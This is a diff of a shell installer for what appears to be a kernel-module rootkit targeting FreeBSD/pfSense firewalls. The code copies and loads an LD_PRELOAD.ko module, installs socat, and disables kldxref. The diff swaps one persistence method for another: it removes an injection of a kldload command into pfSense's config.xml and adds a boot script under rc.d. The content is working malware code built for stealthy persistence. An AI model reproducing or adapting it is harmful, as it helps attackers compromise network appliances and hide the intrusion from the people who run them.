@@ -19,42 +19,11 @@ cp "$LKM_NAME" /boot/modules/
 # therefore we get socat
 pkg install -y socat
 
-# achieve persistance by loading the module everytime the system boots
-# cp ldpreload /usr/local/etc/rc.d/
-# chmod +x /usr/local/etc/rc.d/ldpreload
-
 # service ldpreload start
-
-pkg install -y pfSense-pkg-shellcmd
-
-CONFIG_FILE="/conf/config.xml"
-MODULE_CMD="/bin/sh -c '/sbin/kldload /boot/modules/LD_PRELOAD.ko'"
-TEMP_FILE="/tmp/config.xml"
-# Backup the original config.xml
-cp "$CONFIG_FILE" "/conf/config.xml.bak"
-# Check if <shellcmd> section exists
-if grep -q "<shellcmd>" "$CONFIG_FILE"; then
-    # Append the command inside the existing <shellcmd> section
-    sed "/<shellcmd>/a \\
-        <command>$MODULE_CMD</command>" "$CONFIG_FILE" > "$TEMP_FILE"
-else
-    # Add a new <shellcmd> section before </pfsense>
-    sed "/<\/pfsense>/i \\
-    <shellcmd>\\
-        <command>$MODULE_CMD</command>\\
-    </shellcmd>" "$CONFIG_FILE" > "$TEMP_FILE"
-fi
-# Overwrite the original config.xml with the updated one
-mv "$TEMP_FILE" "$CONFIG_FILE"
-# Apply changes
-/etc/rc.reload_all
-
+mv ldpreload.sh /usr/local/etc/rc.d/
+chmod +x /usr/local/etc/rc.d/ldpreload.sh
 
 # Disable kldxref by setting kldxref_enable="NO"
 sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf
 
 kldload "/boot/modules/$LKM_NAME"
-
-# mkdir /boot/kernel/.ko_backup/
-
-# cp "/Apekit-rootshit/$LKM_NAME" /boot/kernel/.ko_backup/
